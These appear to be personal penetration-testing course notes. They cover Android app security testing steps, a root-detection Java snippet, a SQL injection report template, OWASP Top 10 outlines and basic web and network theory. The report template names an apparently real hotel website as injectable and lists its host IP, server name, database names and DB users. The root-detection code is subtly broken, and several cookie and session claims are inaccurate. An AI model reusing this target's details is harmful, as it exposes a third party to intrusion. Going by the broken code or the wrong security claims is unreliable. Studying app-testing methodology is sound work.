❖ Finding 5: Application Data Backup is Enabled
❖ Finding 6: Application UsesClearTextTraffic Enabled
❖ Finding 7: Application Exported is Enabled
❖ Finding 8: Insecure Logging and Unintended Data Storage
❖ Finding 9: Successful Reverse Engineering

Steps: Finding 1, 2, 3
1. Install the application in android device/emulator.
2. After installing the application, enter login credentials and explore the application.
3. Logout the application and open root browser, then go to path “data/data/com.application.name” Copy all the folders, go to internal storage of the device and create a new folder and paste the copied folders here.
Here are the steps on how to prevent an app from running in a rooted Android device:
1.	Check for the presence of root-only files or directories. This is one of the most common methods for root detection. You can check for the presence of files or directories that are only accessible to root users. For example, you can check for the existence of the /su directory or the su binary.
2.	Check for the presence of root-only permissions. You can also check for the presence of permissions that are only granted to root users. For example, you can check for the SU permission or the MOUNT_UNMOUNT_FILESYSTEMS permission.
3.	Check for the presence of root-only system binaries. You can also check for the presence of system binaries that are only available to root users. For example, you can check for the existence of the su binary or the busybox binary.
4.	Use the Google SafetyNet Attestation API. The Google SafetyNet Attestation API is a more reliable way to detect root devices. This API checks the device's integrity and returns a response that indicates whether the device is rooted or not.
Once you have determined that the device is rooted, you can take appropriate action. For example, you can refuse to run the app, or you can display a warning message.
Here is an example of how to implement root detection in an Android APK:
import android.content.Context;
import android.os.Build;

public class RootDetector {
    public static boolean isRooted(Context context) {
        // Check for the presence of root-only files or directories.
        if (new File("/su").exists()) {
            return true;
        }
        // Check for the presence of root-only permissions.
        if (context.getPackageManager().checkPermission("SU", "android") == PackageManager.PERMISSION_GRANTED) {
            return true;
        }
        // Check for the presence of root-only system binaries.
        if (new File("/system/bin/su").exists()) {
            return true;
        }
        // Use the Google SafetyNet Attestation API.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            String safetyNetResponse = SafetyNet.getAttestationResponse(context);
            if (safetyNetResponse != null) {
                return false;
            }
        }

        return false;
    }
}
This code will check for the presence of root-only files, directories, permissions, and system binaries. If any of these are found, the method will return true, indicating that the device is rooted. Otherwise, the method will return false.

4. Now make a zip of it and send it to your computer.
5. Unzip the zip and open every file with notepad or DB Browser (Only for .db extension files) and look for sensitive data such as username, email id, client id, password, mobile number, bank account number, etc.
6. If sensitive data found in .db (extension) file then we give finding 1: Database Store in Android Device without Encryption.
7. If sensitive data found in any other file, then we give finding 2: Insecure Data Storage.
8. For finding 3 POC, open root browser and go to “ data -> data -> com.application.name” and take POC of this screen, after that open the application folder and take another POC here (showing all folders of the application).
9. For Finding 1 and 2, take POC of the file that contains sensitive data and note the path of that file as we have to mention this file name and path in our report.

Steps: Finding 4, 5, 6, 7, 8
1. Get your application apk and send it your kali, if you downloaded the application from Google PlayStore then you need to extract the apk. To extract the apk download “APK Extractor” from playstore, install it and extract the apk.
2. Now install “apktool” in your kali terminal.
3. After installing apktool enter the command “apktool d sample.apk” to decompile the apk.
4. Go to the extracted folder and open “AndroidManifest.xml” and Find this code:
android:debuggable="true", if the value is set to true then it’s Finding 4.
android:allowBackup="true", if the value is set to true then it’s Finding 5.
android:usesCleartextTraffic="true", if the value is set to true then it’s Finding 6.
android:exported="true", if the value is set to true then it’s Finding 7.
5. For Finding 7 if the exported value is se to true then you need to use drozer to call that specific activity and check if it opens by drozer or not. 
6. To install the drozer kindly visit HOW TO INSTALL DROZER and install it your kali Linux.
7. After installing the drozer, download Wifi ADB Android Application from playstore and install it in your android device/emulator. Enter the command shown in the home page of wifi ADB Application and connect your terminal to your device.
8. Now run the drozer commands by visiting Drozer commands · GitHub.
9. If drozer can open any activity that contains any sensitive user data then the exported activity is vulnerable means it’s Finding 7.
10. For Finding 8, connect the linux terminal with device/emulator using wifi adb.
11. Now install the application in the device/emulator but don’t login the application.
12. Go to the terminal and run the command “adb logcat” and press enter, now open the app enter the credentials and log into the app. Explore the app by visiting every page.
13. Now stop the logcat by pressing ctrl+z. And search the logs for any sensitive data. If any sensitive data is found in the logs, then its Finding 8.

Steps: Finding 9
1. Get the apk in your normal Windows/Linux Computer and upload the apk on this online decompilers to decompile the apk by visiting javadecompilers.com or Decompiler.com
2. Now download this decompiled apk, zip folder and unzip it.
3. Search for classes.dex file, and open it using the Jadx GUI Application. To download the Jadx GUI go to Releases · skylot/jadx · GitHub.
4. In the Jadx GUI, open every folder and search for MainActivity.class file and check the java or kotlin code.
5. If you haven’t found the MainActivity.class file, then open any activity which seems 
important for the application and check its code. 
HOW TO MAKE VULN REPORT
Find contact on target site 
Vulnerability Name: SQL Injection
Description:
•	SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. 
•	It generally allows an attacker to view data that they are not normally able to retrieve. 
•	This might include data belonging to other users, or any other data that the application itself is able to access. 
•	In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

Affected Resources/URL: http://www.embryohotel.com/room<ietail.php?id=l
Parameter: id
Impact:
•	A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. 
•	Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. 
•	In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.
Recommendation:
•	Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
Tools Used: Hwyji
References: https://portswigger.net/web-security/sql-injection
POC:( proof of concept)
 
Database Related Details:
Host IP: 163.44.08.59
Web Server: Apache
Powered-by: PHP/5.6.40
DB Server: MySQL
Current User: cp227754_pyxis@localhost
Sat Version: 5.6.51
Current DB: cp227754_embryohoteI_db
System User: cp227754_pyxis@locaIhost
Host Name: cpane110wh.bkk1.cloud.z.com
Installation dir: /usr/ 
DB User: 'asdáw’@’localhost'
Data Bases: information schema
cp227754 embryohotel_db

OWASP TOP 10 V vulnerabilities
https://portswigger.net/support/using-burp-to-test-for-the-owasp-top-ten


AO1:2021-Broken Access Control
•	Access control vulnerabilities and privilege escalation
•	Using Burp's site map to test for access control issues
•	Using Burp's "Request in browser" function to test for access control issues
•	Using Burp to test for parameter manipulation and forced browsing issues

A02:2021-Cryptographic Failures
A02:2017-Sensitive Data Exposure
•	Using Burp to Test for Sensitive Data Exposure Issues

A03:2021-lnjection
•	Using Burp to Test For Injection Flaws
•	Injection Attack: Bypassing Authentication
•	Using Burp to Detect SQL-specific Parameter Manipulation Flaws
•	Using Burp to Exploit SQL Injection Vulnerabilities: The UNION Operator
•	Using Burp to Detect Blind SQL Injection Bugs
•	Using Burp to Exploit Bind SQL Injection Bugs

A03:2017-Cross Site Scripting (XSS)
•	Using Burp to Find Cross-Site Scripting Issues
•	Using Burp to Manually Test for Reflected XSS
•	Using Burp to Manually Test for Stored XSS
•	Using Burp to Exploit XSS - Injecting into Direct HTML
•	Using Burp to Exploit XSS - Injecting in to Tag Attributes
•	Using Burp to Exploit XSS - Injecting into Scriptable Contexts

A04:2021-Insecure Design

A05:2021-Security Misconfiguration
•	Using Burp to Test for Security Misconfiguration Issues

A05:2017-XML External Entities (XXE)
•	XML external entity (XXE) injection
•	XML entities
•	Finding and exploiting blind XXE vulnerabilities

A06:2021-Vulnerable and Outdated Components
A06:2017-Using Components with Known Vulnerabilities
•	Using Burp to Test for Components with Known Vulnerabilities

A07:2021-Identification and Authentication Failures
A07:2017-Broken Authentication and Session Management
•	Using Burp to Brute Force a Login Page
•	Using Burp to Test for Sensitive Data Exposure Issues
•	Injection Attack: Bypassing Authentication
•	Using Burp to Hack Cookies and Manipulate Sessions
•	Using Burp to Test Token Generation
•	Using Burp to Test Session Token Handling
•	Forced Browsing
•	Using Burp to Test for Insecure Direct Object References

A08:2021-Software and Data Integrity Failures
A08:2017-Insecure Deserialization
•	Using Burp to Test for Insecure deserialization

A09:2021-Security Logging and Monitoring Failures*
A09:2017-Insufficient Logging & Monitoring

A1O:2021-Server-Side Request Forgery
•	Using Burp to Test for Server-side request forgery (SSRF)

 
ANZEN TECH NOTES:

Day 14 March 23

1.	Web application architecture:
a.	Front-end: The front-end is responsible for presenting the user interface and handling user input. As a cybersecurity professional, you need to look for vulnerabilities such as cross-site scripting (XSS) and cross-site request forgery (CSRF) that can be exploited by attackers to steal user data or perform unauthorized actions.

b.	Back-end: The back-end is responsible for processing user requests, performing database operations, and managing the application's business logic. You need to look for vulnerabilities such as SQL injection and command injection that can be exploited by attackers to gain unauthorized access to sensitive data or execute malicious code.

c.	Database: The database is where the application's data is stored. You need to look for vulnerabilities such as weak passwords and SQL injection that can be exploited by attackers to steal or modify data.
d.	APIs: APIs (Application Programming Interfaces) are used to enable communication between the front-end and the back-end. You need to look for vulnerabilities such as insecure API endpoints and insufficient authentication and authorization that can be exploited by attackers to access sensitive data or perform unauthorized actions.

e.	Authentication and Authorization: Authentication and authorization are critical components of web application security. You need to look for vulnerabilities such as weak password policies, session management issues, and insufficient access controls that can be exploited by attackers to gain unauthorized access to the application or user data.

f.	Web servers: Web servers are responsible for serving web pages and handling HTTP requests. You need to look for vulnerabilities such as server misconfigurations, outdated software versions, and insufficient security controls that can be exploited by attackers to gain unauthorized access to the server or execute malicious code.

2.	Session key and cookie:
a.	Session keys:
i.	Session keys are unique, temporary keys that are generated by the web application to authenticate and authorize user sessions. When a user logs into a web application, the server generates a session key that is associated with the user's session. The session key is then sent to the user's browser as a cookie, which is stored locally on the user's device.

ii.	The session key is used by the server to identify the user's session and authorize access to protected resources. When the user makes subsequent requests to the application, the session key is sent back to the server in the HTTP headers. The server then uses the session key to retrieve the user's session information and continue the session.

iii.	Session keys are an important security mechanism in web applications because they help to prevent unauthorized access to user sessions. If an attacker were to intercept a session key, they would be able to impersonate the user and access their session. To prevent this, session keys are typically encrypted and hashed before being sent to the user's browser.

b.	Cookies:
i.	Cookies are small text files that are stored on the user's device by the web application. Cookies are used to store session information, preferences, and other data related to the user's interaction with the application.

ii.	When a user logs into a web application, the server sends a cookie to the user's browser that contains the session key and other session information. The cookie is then stored locally on the user's device and is sent back to the server with each subsequent request.

iii.	Cookies are an important security mechanism in web applications because they help to prevent CSRF (cross-site request forgery) attacks. CSRF attacks occur when an attacker tricks the user's browser into making unauthorized requests to the web application. By including a session key in the cookie, the server can verify that the request is legitimate and prevent the attack.

iv.	However, cookies can also be a security risk if they are not properly secured. If an attacker is able to intercept a cookie, they can use it to gain unauthorized access to the user's session. To prevent this, cookies should be encrypted and hashed before being sent to the user's browser, and the web application should use HTTPS to encrypt all data transmitted between the server and the user's browser.

3.	OSI Model
a.	Physical Layer: The physical layer is responsible for transmitting and receiving raw data between devices. It deals with the physical characteristics of the network, such as the cable type, connectors, and transmission rates. From a security standpoint, this layer can be vulnerable to physical attacks, such as cable tapping or interference.

b.	Data Link Layer: The data link layer is responsible for transferring data between nodes on the same network segment. It provides error detection and correction and manages access to the physical media. From a security standpoint, this layer can be vulnerable to MAC address spoofing or attacks that attempt to overload the network with traffic.

c.	Network Layer: The network layer is responsible for routing data between networks. It provides logical addressing, packet fragmentation and reassembly, and congestion control. From a security standpoint, this layer can be vulnerable to attacks that attempt to spoof IP addresses or inject malicious packets into the network.

d.	Transport Layer: The transport layer is responsible for ensuring reliable communication between end-to-end applications. It provides error detection and recovery, flow control, and segmentation and reassembly of data. From a security standpoint, this layer can be vulnerable to attacks that attempt to exploit vulnerabilities in the protocol or attempt to overload the network with traffic.

e.	Session Layer: The session layer is responsible for establishing, maintaining, and terminating sessions between applications. It provides synchronization, checkpointing, and recovery functions. From a security standpoint, this layer can be vulnerable to attacks that attempt to hijack sessions or attempt to steal session tokens.

f.	Presentation Layer: The presentation layer is responsible for translating data between the application and network formats. It provides data compression, encryption, and decryption. From a security standpoint, this layer can be vulnerable to attacks that attempt to intercept and decode encrypted data or attempt to exploit vulnerabilities in the compression algorithm.

g.	Application Layer: The application layer is responsible for providing services to the end-user applications. It includes protocols such as HTTP, FTP, SMTP, and Telnet. From a security standpoint, this layer can be vulnerable to attacks that attempt to exploit vulnerabilities in the application or attempt to steal sensitive information, such as passwords or credit card numbers.

4.	OWASP Top 10 (Portswiggers)
1.	Injection
•	SQL injection
•	Command injection
•	Server-side request forgery (SSRF)
•	XXE injection
•	Insecure deserialization

2.	Broken Authentication and Session Management
•	Authentication
•	OAuth authentication
•	JWT attacks

3.	Improper Output Handling (formerly Cross-Site Scripting)
•	Cross-site scripting (XSS)

4.	Insecure Design
•	Business logic vulnerabilities

5.	Security Misconfiguration
•	Directory traversal
•	Information disclosure

